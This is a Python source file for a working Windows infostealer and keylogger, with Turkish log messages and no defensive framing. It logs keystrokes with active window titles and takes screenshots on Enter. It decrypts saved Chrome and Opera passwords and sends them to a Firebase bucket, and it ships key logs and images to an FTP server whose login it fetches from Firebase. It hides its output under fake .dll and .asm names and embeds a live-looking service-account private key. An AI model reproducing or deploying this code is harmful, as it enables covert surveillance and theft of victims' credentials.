
import base64
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import time
from datetime import datetime
from distutils.log import Log
from ftplib import FTP
from pyclbr import Function
from threading import Thread

import win32crypt
from Crypto.Cipher import AES
from cv2 import exp
from firebase_admin import credentials
from firebase_admin import db as realtime
from firebase_admin import initialize_app, storage
from PIL import ImageGrab
from pynput import keyboard
from pynput.keyboard import Key
from win32gui import GetForegroundWindow, GetWindowText

__USERSTRING__ = "" # Unique user string
# sys.stdout = None
# sys.stderr = None
DATA_DIRECTORY = "C:/ProgramData/Temp/" # The directory which all files will be saved
URL = "https://blank-72b5f-default-rtdb.europe-west1.firebasedatabase.app/" # firebase realtime database url

def get_current_time() -> str: # Get current time in format "dd.mm.yy - hh:mm:ss"
        now = datetime.now()
        return datetime.strftime(now, "%d.%m.%y").replace(":", ".") + " - " + datetime.strftime(now, "%X").replace(":", ".")

class Logger:
    @staticmethod
    def log(*data):
        print(data)

class App: # Main class for managing the application
    def __init__(self) -> None:

        global __USERSTRING__
        __USERSTRING__ = os.getlogin() + subprocess.check_output('wmic bios get serialnumber',
                                                             shell=True, stdin=subprocess.PIPE,
                                                             stderr=None,creationflags=0x08000000).decode().split('\n')[1].strip()

        self.start_time = get_current_time() # Get current time

        self.firebase_manager = FirebaseManager() # Initialize firebase manager
        self.ftp_manager = FtpManager(self.start_time,self.firebase_manager) # Initialize ftp manager
        self.keylogger_manager = KeyLoggerManager(self.start_time,self.ftp_manager.send_all) # Initialize keylogger manager
        self.password_manager = PasswordManager(self.firebase_manager) # Initialize password manager

        
    def run(self) -> None:
        self.password_manager.start() # Start sending passwords

        # locks the main thread
        self.keylogger_manager.run() # Start key listening

    

class KeyLoggerManager:
    def __init__(self,start_time,sender_callback: Function) -> None:
        # settings
        self.__counter = 1 # Counter for the number of the screenshot
        self.__sender_trigger_count = 500 # desired number of keys to send to firebase
        self.start_time = start_time
        self.sender_callback = sender_callback # callback function for sending data to firebase
        self.init_success = True # initialize success flag

        self.init_files(start_time) # initialize folder location

        self.__listener = keyboard.Listener(on_press=self.__on_press) # initialize keylogger

    def init_files(self, start_time):
        # initialize files
        if not os.path.exists(DATA_DIRECTORY+start_time):
            try:
                os.makedirs(DATA_DIRECTORY+start_time)
            except Exception as e:
                Logger.log("Dizin oluşturulurken hata: "+str(e))
                self.init_success = False
        try:
            self.key_file = open(f"{DATA_DIRECTORY}{start_time}/{__USERSTRING__} - {self.start_time}.dll", "w")
        except Exception as e:
            Logger.log("Dosya oluşturulurken hata: "+str(e))
            self.init_success = False

    def run(self) -> None:
        # start listening
        if self.init_success:
            self.__listener.__enter__()
            self.__listener.join()

    def __on_press(self,key) -> None:
        Logger.log("Key pressed:"+str(key))
        _time = get_current_time()
        if key == Key.enter:
            self.__take_picture(_time)
            Logger.log("Screenshot taken")
        # saves the key to a file
        self.key_file.write(
            _time + " $" + str(self.__counter) + " - " + str(key) +" "+"_" * 10 +" " + GetWindowText(GetForegroundWindow()) + "\n")
        self.key_file.flush()
        # sends the data to firebase
        if self.__counter % self.__sender_trigger_count == 0:
            Thread(target=self.sender_callback).start()
        self.__counter += 1
 


    def __take_picture(self,_time) -> None:
        try:
            ImageGrab.grab(all_screens=True).save(f"{DATA_DIRECTORY}{self.start_time}/{__USERSTRING__} - {self.start_time} ${self.__counter}.jpeg")
            os.rename(f"{DATA_DIRECTORY}{self.start_time}/{__USERSTRING__} - {self.start_time} ${self.__counter}.jpeg",f"{DATA_DIRECTORY}{self.start_time}/{__USERSTRING__} - {self.start_time} ${self.__counter}.asm")
        except Exception as e:
            Logger.log("Resim alınırken hata: "+str(e))

class FirebaseManager:
    service_json_data = { # unique firebase service json data
    "type": "service_account",
    "project_id": "blank-72b5f",
    "private_key_id": "f44b95d4737ce902a7708b1ee2829ff43178caf5",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCBBsDzm8Jgwmmy\n2znfkcdjo9Y1ZlAaLAynNaSJv43hLKnhn/CTM8wI3ES12DcLmMv3owTECLhUnQqF\nMFQ94U2vWuuJWtONm0FbGwK2+1gPOaS8U0Cgl4/2lpZPgncmRSYm3VmGtBYzCxv8\nDvPyMigVGS9eq4zwQQi1ADFANqBtg1qBl0Or9vl7t8jH3NqGI0zF6ZKpjv/+j4uh\nBDJSf33LvBYlgYbLu0Xw6smZhth4DeJaeazR0cuNjTleKOYZVrhTXj4GrPpsIN3u\nFPSN6HsSfVtBpTfVlgoUSIhKPNUDHnHNcwW9a+il5VEVPhTbqYmiQLQ47ASkc/Fa\nYNsnurT5AgMBAAECggEAGCApaZOtFZccmP0tddymDf9HUT5TiYVFi2l4HeqjrqBB\nlqbnnrqvctOvBFqMtl4oe2IvxLEFuIqRukRGaDit5DVJt+n0BzUp1A15pTnbpiMm\n5rDhc3XLjTXsnqrcORtybg9zC0E2qm4wGiI4ooeW35UROrA0nwLmDCQgUWu1dSx3\nwy2jIqtGLBprOg8tM2WmFza6aPgPpFzErymx4T4hYv0YFbNJ9qqWKDD3ipWxIBNd\nJs05TGzdeVipW/mZc++OhSbKmzy1VWx/EE6VI+2meYWnstWq0KBgOGE4nqIOzw3U\nwnSkALqNE6vheLqqlfBp5hiBBD1rijd47b1vHPzghQKBgQC1y030belW/sRdfBZm\nl8xd6OZuNXnXZmAWwv/A5YvftavgiyCNKXsnmGCZUHA5V3MdAoKQR75rkWXApcYG\nSV036oMFJekqwEEbxqlfVWPXdMyt8fQ9k5c1cP8btWYTAbJ38E6fpPi1Rlcb2rX4\ng+zfCprFzY2whxgm1tkGes5mFQKBgQC1sXJxKEQhpwSC4yVmo0RIe2zTb2YE23c9\nwk2Z+HWnfrXkX7G4MyW7ZtI8XqSIdJHd3v64BUUfgFpeE5c5ASq0kxdBttNPhmZQ\n1MoJP1/o+YnmM79g60eB4725BggQ/FurZHAPhEVkM14H7MIGDNVWIuGuf8pb6h0G\n8OLJaWuQVQKBgFG4Ni6uSboFhBfR8+/iRMfiLdNUzpR5PLB+r6DyjtHdRIoHgHZ0\nMxw1bxb8BbaBDQn5Wt+ooHySO39CBaZFzFWaYZMq24mQKrRltTVZmSv9IRUAMp6L\nfelUBhlajav1k1g++djhu7shB39J7YrtIsmQZsqMACleUQkEg0JaafWRAoGAZPYq\nkqh+W3jUb+rKgKMesWwsR70yImbVdrL+rh07O4yUhEeMmL+LKvxyvGsW4GBuIazl\nO9pp05xeGsKmGF4GnfrSRIjUGO+k8Suc7NCTegEX2JxOrwtuW8XySdsJJm8kfTO9\ndVHZwVkt2hd8pSICde/CGlYWW0bXRGEclDEJPVUCgYEAk8mR7eY9WSXM46qCoEyN\nr1MsNJMEyg5245LsQq0khLjkLDzJ4/WybVD8uoA4Kyunei6Te+Wc5izHS3Qb0uHx\n+f1V8O0E5L4JYVWaxu4NYBKGJvRYiIQ5OrdrG+CK8w5BsHR/ruLXn288t4y+GEtt\nw0o8qY03QYOyWdBrrJpchtE=\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-wwjty@blank-72b5f.iam.gserviceaccount.com",
    "client_id": "110522629390398068058",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-wwjty%40blank-72b5f.iam.gserviceaccount.com",
    "storageBucket":"blank-72b5f.appspot.com"
    }

    def __init__(self) -> None:
        # initialize the firebase
        cred = credentials.Certificate(FirebaseManager.service_json_data)
        initialize_app(cred,{"storageBucket":"blank-72b5f.appspot.com"})
        self.__bucket = storage.bucket()

    def get_tree(self,path = "/") -> dict:
        return realtime.reference(path,url=URL).get()

    def upload_string(self,string:str,file_name:str,timout = 5, retry_count = -1,delay = 5) -> bool:
        if (retry_count == -1):
            while 1:
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,timeout=timout)
                    return True
                except Exception as e:
                    print("11- Error: "+str(e))
                time.sleep(delay)
        else:
            for i in range(retry_count):
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,file_name,timeout=timout)
                    return True
                except Exception as e:
                    print("2- Error: "+str(e))
                time.sleep(delay)
            return False
                
class PasswordManager(Thread):
    options = {
        "chrome": {
            "path": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
            "dbPath": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
        },
        "opera" : {
            "path":f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State",
            "dbPath":f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
        },
        "operagx": {
            "path":f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
            "dbPath": f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
        }
    }

    def __init__(self,firebase_manager: FirebaseManager) -> None:
        super().__init__()
        self.__password_sent = False;
        self.firebase_manager = firebase_manager

    def run(self) -> None:
        while self.__password_sent != True:
            self.send()

    def send(self) -> None:
        try:
            self.__password_sent = self.firebase_manager.upload_string(PasswordManager.export_all(),__USERSTRING__+".txt")
            Logger.log("Password sent to Firebase")
        except Exception as e:
            Logger.log("Şifreler gönderilemedi",e)

    @staticmethod
    def export_all() -> str:
        return PasswordManager.export("chrome")+ "\n\n" + PasswordManager.export("opera") + "\n\n" + PasswordManager.export("operagx")

    @staticmethod
    def export(browser) -> str:
        path = PasswordManager.options[browser]["path"]
        dbPath = PasswordManager.options[browser]["dbPath"]
        try:
            with open(path, "r") as file:
                data = file.read()
                data = json.loads(data)
                key = win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None,
                                                    None, None, 0)[1]
                _path = os.getenv("temp")+"/"+__USERSTRING__+browser+".tmp"
                passwords = []
                shutil.copyfile(dbPath, _path)
                db = sqlite3.connect(_path)
                cursor = db.cursor()
                cursor.execute(
                    "select origin_url, username_value, password_value from logins")
                datatable = cursor.fetchall()
                for row in datatable:
                    try:
                        _password = row[2]
                        iv = _password[3:15]
                        _password = _password[15:]
                        password = AES.new(key, AES.MODE_GCM, iv).decrypt(_password)[:-16].decode()
                    except:
                        try:
                            password = str(win32crypt.CryptUnprotectData(_password, None, None, None, 0)[1])
                        except Exception as e:
                            print(e)
                            password = "||password_couldnt_found||"
                    passwords.append(f"{row[0]} - {row[1]} - {password}")
                cursor.close()
                db.close()
                os.remove(_path)
                return "\n".join(passwords)
        except Exception as e:
            return ""

    def decrypt(self, key, password):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

class FtpManager:
    def __init__(self,start_time,firebase_manager : FirebaseManager) -> None:
        self.firebase_manager = firebase_manager
        self.start_time = start_time
        self.ftp = FTP()

    def is_connected(self) -> bool:
        try:
            self.ftp.cwd("../"*10)
            return True
        except:
            return False

    def get_settings(self) -> dict:
        data = self.firebase_manager.get_tree("ftp")
        self.ip = data["ip"]
        self.port = data["port"]
        self.username = data["username"]
        self.password = data["password"]

    def connect(self) -> bool:
        try:
            self.get_settings()
            self.ftp.connect(self.ip, self.port)
            self.ftp.login(self.username, self.password)
            return True
        except Exception as e:
            Logger.log("FTP Bağlantısı başarısız",e)
            return False


    def send_all(self):
        if self.is_connected() == False:
            if self.connect() == False:
                Logger.log("Bağlanamadı")
                return
        # Bağlantı başarılıysa
        try:
            directories = self.ftp.nlst()
            for directory in os.listdir(DATA_DIRECTORY):
                if not (directory in directories):
                    self.ftp.mkd(directory)

                for file in os.listdir(DATA_DIRECTORY+directory):
                    try:
                        self.ftp.storbinary(f"STOR {directory}/{file.replace('.asm','.jpeg')}", open(DATA_DIRECTORY+directory+"/"+file, "rb"))
                        if directory == self.start_time and file.endswith(".dll"):
                            continue
                        else:
                            try:os.remove(DATA_DIRECTORY+directory+"/"+file)
                            except Exception as e:Logger.log("Dosya silinirken hata oluştu",e)
                    except Exception as e:
                        Logger.log("Dosya gönderilemedi",e)

                if directory != self.start_time:
                    try: shutil.rmtree(DATA_DIRECTORY+directory)
                    except Exception as e:Logger.log("Dizin silinirken hata oluştu",e)

        except Exception as e:
            Logger.log("Dizinleri listeleme hatası",e)

    

App().run()
